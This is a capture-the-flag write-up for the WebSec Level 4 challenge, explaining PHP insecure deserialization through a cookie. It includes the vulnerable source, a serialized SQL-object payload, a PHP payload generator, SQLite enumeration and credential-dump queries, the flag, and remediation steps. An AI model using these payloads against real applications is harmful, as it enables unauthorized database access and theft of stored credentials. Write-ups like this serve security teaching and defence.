# WebSec Level 4 Writeup — Serialization Is a Pain!

## Overview

This challenge is a classic example of **PHP insecure deserialization** leading to **PHP object injection**, which then becomes **attacker-controlled SQL execution** through a magic method.

At first glance, the application looks like a simple SQLite-backed page that fetches a username by numeric `id`. However, the real vulnerability is not in the `id` parameter. The actual issue is that the application reads a cookie controlled by the client, base64-decodes it, and passes it directly into `unserialize()`.

Because the `SQL` class is already loaded on the server, an attacker can replace the expected serialized array with a serialized `SQL` object. That injected object carries attacker-controlled properties, and when the request ends, its `__destruct()` method runs automatically, reconnects to the database if needed, executes the attacker's query, and prints the result.

The high-level exploit chain is:

```text
Attacker-controlled cookie
-> base64_decode
-> unserialize
-> injected SQL object
-> bypass IP check
-> __destruct() auto-runs
-> execute attacker-controlled SQL
-> enumerate database
-> dump flag
```

---

## Source Code

### `connect.php`

```php
<?php

class SQL {
    public $query = '';
    public $conn;

    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```

### Main page

```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';

if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```

---

## Understanding the OOP Pieces

This challenge becomes much easier once the `SQL` class is understood properly.

### Properties

The class defines two public properties:

- `query`: stores the SQL statement to execute.
- `conn`: stores the active SQLite connection.

Because these properties are `public`, they can be set through a serialized object payload.

### `__construct()`

The constructor exists but is empty. It is not relevant to the exploit.

### `connect()`

This method opens the SQLite database in read-only mode and stores the connection in `$this->conn`.

### `execute()`

This method runs whatever SQL statement is stored in `$this->query`.

### `__destruct()`

This is the key method in the challenge.

`__destruct()` is a PHP magic method that runs automatically when an object is destroyed, usually at the end of the request.

Here it does three dangerous things:

1. If no database connection exists, it reconnects automatically.
2. It executes the query stored in the object's `query` property.
3. It prints each result row using the `username` column.

This means that **if an attacker can create a `SQL` object with a controlled `query` property, the attacker's SQL will run automatically when the request ends**.

---

## Normal Application Flow

Before exploiting the application, it is useful to understand how the developer intended it to work.

1. The page is requested.
2. `connect.php` is included, loading the `SQL` class.
3. The application creates a legitimate `SQL` object:

   ```php
   $sql = new SQL();
   $sql->connect();
   $sql->query = 'SELECT username FROM users WHERE id=';
   ```

4. The application checks whether the cookie `leet_hax0r` already exists.

### If the cookie does not exist

The application creates a cookie containing the visitor IP address as a serialized array:

```php
array('ip' => $_SERVER['REMOTE_ADDR'])
```

That array is then:

- serialized with `serialize()`
- encoded with `base64_encode()`
- stored in the cookie

### If the cookie exists

The application does this:

```php
$sess_data = unserialize(base64_decode($_COOKIE['leet_hax0r']));
```

The developer expects the cookie to decode back into an array like:

```php
array('ip' => 'x.x.x.x')
```

5. The application performs an IP consistency check:

   ```php
   if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
       die('CANT HACK US!!!');
   }
   ```

6. If the user provides a numeric `id`, it gets appended to the base query.

7. At the end of the request, the legitimate `$sql` object is destroyed, so its destructor runs and prints the result.

---

## Root Cause

The vulnerability is here:

```php
$sess_data = unserialize(base64_decode($_COOKIE['leet_hax0r']));
```

This is dangerous because:

- cookies are controlled by the client
- the value is therefore untrusted
- `unserialize()` can rebuild not only arrays, but also objects

The developer assumes the cookie will always contain a serialized array, but the attacker can instead send a serialized object.

Because `connect.php` has already been included, the `SQL` class exists when `unserialize()` runs. That allows PHP to recreate a `SQL` object from attacker-controlled data.

This is a textbook case of:

- **Insecure deserialization**
- leading to **PHP object injection**

---

## Why the IP Check Fails

The code only rejects the cookie when the unserialized value is an array and the stored IP does not match the current IP:

```php
if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
    die('CANT HACK US!!!');
}
```

If the attacker sends a serialized `SQL` object instead of an array, then:

```php
is_array($sess_data) === false
```

So the whole `if` condition fails immediately and the IP check is skipped.

The bypass does **not** come from spoofing the IP. It comes from changing the expected data type from **array** to **object**.

---

## Important Clarification: We Do Not Overwrite the App's Original `$sql`

A common misunderstanding is to think that the exploit modifies the original `$sql` object created by the application.

That is **not** what happens.

The application already has one legitimate object:

```php
$sql = new SQL();
```

Then the cookie is unserialized into a **second** object, stored in `$sess_data`.

If the cookie contains a serialized `SQL` object, then after `unserialize()` the server effectively has two `SQL` objects in memory:

- the legitimate `$sql` object created by the application
- the attacker-injected `SQL` object created from the cookie

The exploit works because the injected object also has the same `__destruct()` method. When the request ends, the injected object's destructor runs too.

---

## Why This Becomes SQL Execution

The attacker-injected object can control these properties:

- `query`
- `conn`

If the attacker sets:

- `query` to an arbitrary SQL statement
- `conn` to `null`

then the destructor will behave like this:

1. `conn` is not set, so `connect()` is called automatically.
2. `execute()` runs the SQL inside `query`.
3. The results are printed.

So the exploit is not classic SQL injection into an existing query string. It is more accurate to describe it as:

**attacker-controlled SQL execution via object injection and destructor abuse**.

---

## Why `AS username` Is Required

The destructor prints result rows like this:

```php
echo $row['username'];
```

So the query output must contain a column named `username`.

That is why payloads are written like:

```sql
SELECT name AS username FROM sqlite_master WHERE type='table'
```

The alias makes the result fit the output code.

---

## Manual Payload Structure

A serialized PHP object has this general structure:

```text
O:<class_name_length>:"ClassName":<property_count>:{...}
```

For this challenge, a `SQL` object with `query` and `conn` looks like:

```text
O:3:"SQL":2:{s:5:"query";s:<LEN>:"<SQL>";s:4:"conn";N;}
```

Explanation:

- `O` = object
- `3:"SQL"` = class name is `SQL`, length 3
- `2` = two properties
- `s:5:"query"` = property name `query`, length 5
- `s:<LEN>:"<SQL>"` = the SQL string
- `s:4:"conn"` = property `conn`, length 4
- `N` = `null`

A manual payload for table enumeration is:

```text
O:3:"SQL":2:{s:5:"query";s:61:"SELECT name AS username FROM sqlite_master WHERE type='table'";s:4:"conn";N;}
```

That raw payload must then be base64-encoded before being used as the cookie value.

---

## Safer Payload Generation With PHP

Instead of counting every character manually, the easiest and most reliable method is to let PHP serialize the object for you.

```php
<?php
class SQL {
    public $query = '';
    public $conn;
}

function make_payload($sql) {
    $obj = new SQL();
    $obj->query = $sql;
    $obj->conn = null;
    return base64_encode(serialize($obj));
}

echo make_payload("SELECT name AS username FROM sqlite_master WHERE type='table'"), "\n";
?>
```

Run it with:

```bash
php payload.php
```

Then place the output in the `leet_hax0r` cookie.

---

## Exploitation Steps

### Step 1: Enumerate Tables

The first useful query is:

```sql
SELECT name AS username FROM sqlite_master WHERE type='table'
```

This uses SQLite's system table `sqlite_master` to list all table names.

Output:

```text
Username: users
```

So the database contains a table called `users`.

---

### Step 2: Read the Schema of `users`

Next, query the table creation SQL:

```sql
SELECT sql AS username FROM sqlite_master WHERE name='users'
```

Output:

```text
Username: CREATE TABLE users(id int, username varchar, password varchar)
```

Now the schema is known:

- `id`
- `username`
- `password`

---

### Step 3: Dump the Contents

A simple dump query is:

```sql
SELECT password AS username FROM users
```

A more informative version is:

```sql
SELECT username || ':' || password AS username FROM users
```

In SQLite, `||` concatenates strings.

Output:

```text
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```

That is the flag.

---

## Full Exploit Flow

The full exploit flow can be summarized like this:

1. Observe that the cookie is base64-decoded and unserialized.
2. Realize that the cookie is attacker-controlled.
3. Notice that the `SQL` class is loaded before `unserialize()`.
4. Create a serialized `SQL` object instead of the expected serialized array.
5. Set `query` to attacker-controlled SQL.
6. Set `conn` to `null` so the destructor reconnects automatically.
7. Send the base64-encoded object as the `leet_hax0r` cookie.
8. Bypass the IP check because the payload is an object, not an array.
9. Let the request end.
10. The injected object's `__destruct()` runs automatically.
11. The destructor connects to the database and executes the attacker's query.
12. Enumerate `sqlite_master`, inspect schema, and dump the flag.

---

## Techniques Used

This challenge combines several useful offensive concepts:

### 1. Insecure Deserialization

The application unserializes untrusted input.

### 2. PHP Object Injection

A serialized `SQL` object is injected through the cookie.

### 3. Magic Method Abuse

The exploit relies on `__destruct()` running automatically.

### 4. Attacker-Controlled SQL Execution

The query executed by the destructor comes from attacker-controlled object properties.

### 5. SQLite Enumeration

The attacker uses `sqlite_master` to discover tables and schemas before dumping data.

---

## Common Pitfalls When Crafting Payloads

### Mistake 1: Forgetting that the cookie must be base64-encoded

The server expects:

```php
unserialize(base64_decode($_COOKIE['leet_hax0r']))
```

So the cookie value is not the raw serialized string. It must be base64 of that string.

### Mistake 2: Forgetting the `username` alias

The page prints `$row['username']`, so if the query returns a different column name, the output may appear empty.

### Mistake 3: Setting `conn` incorrectly

The easiest option is `null`. That ensures `isset($this->conn)` is false and the destructor reconnects.

### Mistake 4: Confusing the injected object with the application's original object

The exploit does not modify `$sql`. It injects a second `SQL` object.

### Mistake 5: Manual serialization length errors

If the length values in a hand-written serialized payload are wrong, `unserialize()` fails. In practice, auto-generating the payload with PHP is much safer.

---

## Why the Developer Used `serialize()` in the First Place

The developer wanted to store structured data in a cookie:

```php
array('ip' => $_SERVER['REMOTE_ADDR'])
```

Cookies can only store strings, not arrays. So the developer converted the array into a string with `serialize()`, then base64-encoded it so it would be safer to transport as cookie data.

The mistake is not simply using `serialize()` for storage. The real mistake is trusting that client-side cookie and feeding it back into `unserialize()` without protection.

---

## Real-World Relevance

This pattern has existed in real PHP applications:

- state stored in cookies
- data serialized for convenience
- later unserialized when the client sends it back

In real-world code, insecure deserialization can lead to much more than SQL execution. Depending on the available classes and magic methods, it can lead to:

- file write
- file delete
- SSRF
- local file inclusion
- command execution
- even full RCE

This challenge is a clean educational example because the gadget is short and the sink is obvious.

---

## Remediation

To fix this class of issue in real applications:

1. Never call `unserialize()` on untrusted client-controlled data.
2. Prefer `json_encode()` / `json_decode()` for simple data structures.
3. Store sensitive state on the server side instead of in cookies.
4. If state must be stored client-side, sign or authenticate it so tampering is detectable.
5. If `unserialize()` absolutely must be used, restrict object creation with strict options such as `allowed_classes => false`, although avoiding it entirely is still better.

---

## Final Takeaway

The challenge looks simple on the surface, but the important lesson is not SQL syntax. The real lesson is how PHP object injection works:

- attacker controls serialized input
- the server rebuilds an object
- a magic method runs automatically later
- attacker-controlled properties drive dangerous behavior

In one sentence:

> The application expected a serialized array containing the client IP, but because it unserialized attacker-controlled cookie data, an attacker could replace that array with a serialized `SQL` object whose destructor automatically reconnected to the database and executed attacker-controlled SQL when the request ended.

---

## Flag

```text
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```
